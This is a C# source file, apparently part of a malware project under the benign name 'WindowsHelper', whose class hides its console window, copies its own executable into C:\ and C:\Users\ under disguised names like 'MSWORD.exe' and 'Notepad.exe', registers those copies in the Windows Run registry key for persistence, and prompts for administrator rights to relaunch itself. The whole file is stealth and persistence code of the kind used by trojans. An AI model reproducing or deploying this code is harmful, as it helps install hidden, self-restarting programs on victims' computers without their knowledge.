using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace WindowsHelper
{
    internal class CurrentSystem
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public CurrentSystem()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            Console.WriteLine("Console should be hidden now");
            String tshis = "asdas";
        }
        public bool hasRan()
        {
            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string executableName = Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
            string executableFullPath = Directory.GetCurrentDirectory() + "\\" + executableName;
            if (startupKey.GetValue(executableName) == null)
            {
                return false;
            }
            return true;

        }
        public void AddToStartup()
        {
            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string executableName = Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
            string executableFullPath = Directory.GetCurrentDirectory() + "\\" + executableName;
            if (startupKey.GetValue(executableName) == null)
            {
                // Add the executable to startup
                List<String> randomFileNames = new List<String>() { "MSWORD.exe", "Notepad.exe" };
                List<String> copyPaths = new List<String>() { "C:\\", "C:\\Users\\" };
                var rand = new Random();
                foreach (string path in copyPaths)
                {
                    string copyPathNow = Path.Combine(path + randomFileNames[rand.Next(randomFileNames.Count)]);
                    File.Copy(executableFullPath, copyPathNow);
                    startupKey.SetValue("MSWORD" + copyPaths.FindIndex(a => a.Contains(path)), copyPathNow);
                }
                startupKey.SetValue(executableName, executableFullPath);
                Console.WriteLine("Added to startup.");
            }
            else
            {
                Console.WriteLine("Already in startup.");
            }
        }

        internal void TryAdmin()
        {
            if (!IsAdministrator())
            {
                // Restart the program as an administrator
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.UseShellExecute = true;
                startInfo.WorkingDirectory = Environment.CurrentDirectory;
                startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
                startInfo.Verb = "runas";

                try
                {
                    Process.Start(startInfo);
                }
                catch (Exception ex)
                {
                    // The user refused the elevation prompt or some other error occurred
                    Console.WriteLine("Failed to start the process as administrator: " + ex.Message);
                    return;
                }

                // The program is already running as an administrator
                // Add your main program logic here
            }

            // Environment.Exit(0);
        }

        internal bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);

        }
    }
}
